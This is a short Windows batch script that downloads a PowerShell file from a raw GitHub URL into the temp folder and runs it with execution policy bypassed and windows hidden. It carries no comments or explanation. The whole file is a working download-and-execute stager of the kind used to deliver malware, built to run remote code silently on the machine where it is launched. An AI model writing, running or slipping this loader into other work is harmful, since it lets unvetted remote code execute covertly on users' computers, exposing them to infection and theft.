@echo off
set "url=https://raw.githubusercontent.com/Samuitl/New-Test/main/test.ps1"
set "tempfile=%TEMP%\test.ps1"
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%tempfile%'); Start-Process -WindowStyle Hidden -FilePath 'powershell' -ArgumentList '-ExecutionPolicy Bypass', '-File', '%tempfile%'"
